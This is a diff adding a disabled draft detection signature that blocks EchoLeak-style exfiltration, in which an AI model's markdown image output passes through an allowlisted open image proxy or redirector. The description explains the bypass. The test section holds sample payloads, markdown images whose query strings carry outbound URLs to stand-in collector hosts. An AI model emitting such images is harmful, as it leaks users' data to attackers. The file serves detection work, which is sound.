@@ -1,0 +1,45 @@
+# AEGIS-TI-022 - ported from staging/feed-seed by feed_service/port_staging.py (contract shape, CONTRACTS 4.7)
+id: AEGIS-TI-022
+enabled: false  # draft: authoring-only flag, enable + Publish to ship it
+title: EchoLeak exfiltration via an allowlisted image proxy / open redirector
+description: >-
+  Demo signature, initially DISABLED (lives in pending/, not in the published feed). EchoLeak-class exfiltration can survive a host allowlist when the attacker routes the markdown image through an allowlisted host that exposes an open image proxy or redirector: ![x](https://assets.acme-capital.example/img/proxy?src=https://attacker/...). The base EchoLeak signature (AEGIS-TI-014) allowlists that host and so lets the payload through. This signature blocks any markdown image on an allowlisted proxy host whose path is a proxy/redirect endpoint AND whose query carries an outbound http(s) URL (src/url/u/target/dest/redirect). Publishing it flips the demo payload from ALLOW to BLOCK.
+status: stable
+severity: high
+confidence: high
+aliases: [CVE-2025-32711]
+references:
+  - https://cveawg.mitre.org/api/cve/CVE-2025-32711
+tags: [LLM02:2026, LLM10:2026, ASI01, CWE-601]
+published: "2026-10-03"
+modified: "2026-10-03"
+applies_to:
+  surfaces: [model.response, tool.output, mcp.result, tool.input, mcp.call]
+match:
+  type: url
+  extract: markdown
+  kinds: [image, refdef, html_img]
+  host_in:
+    - "assets.aegis-corp.example"
+    - "*.aegis-corp.example"
+    - assets.acme-capital.example
+    - '*.acme-capital.example'
+  path_regex: '(?i)/(img/)?(proxy|redirect|redir|fetch|r|out|link)(/|\?|$)'
+  query_regex: '(?i)(^|[?&])(src|url|u|target|dest|destination|redirect|next|out)=https?'
+action: block
+message: "Markdown image routes an outbound URL through an allowlisted open image-proxy/redirector (EchoLeak bypass). Blocked."
+tests:
+  positive:
+    - name: the live demo payload (allowlisted proxy carrying an outbound src)
+      surface: model.response
+      text: "Here is your summary.\n\n![Q3 revenue chart](https://assets.acme-capital.example/img/proxy?src=https://cdn.example/chart.png&ref=UECB3F2A9)"
+    - name: reference-style image through a redirect endpoint on an allowlisted subdomain
+      surface: model.response
+      text: "![c][c]\n\n[c]: https://cdn.acme-capital.example/redirect?url=https://collector.example/p.gif&d=QUJD"
+  negative:
+    - name: ordinary static image on the same allowlisted host (no proxy path)
+      surface: model.response
+      text: "![logo](https://assets.acme-capital.example/static/logo.png)"
+    - name: proxy endpoint but no outbound URL in the query (benign resize)
+      surface: model.response
+      text: "![thumb](https://assets.acme-capital.example/img/proxy?w=120&h=80&id=42)"
